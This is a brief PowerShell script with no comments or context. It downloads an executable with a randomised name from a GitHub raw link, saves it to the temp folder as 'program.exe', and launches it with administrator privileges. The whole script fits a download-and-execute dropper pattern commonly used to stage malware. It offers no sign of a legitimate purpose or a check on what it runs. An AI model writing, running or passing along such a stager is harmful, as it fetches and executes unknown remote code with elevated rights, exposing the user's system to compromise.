$url = "https://github.com/myxiaomi626-hub/xyessoty/raw/refs/heads/main/cmytbeh1x3quegck.exe"
$output = "$env:TEMP\program.exe"

[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
Invoke-WebRequest -Uri $url -OutFile $output -UseBasicParsing

Start-Process -FilePath $output -Verb RunAs
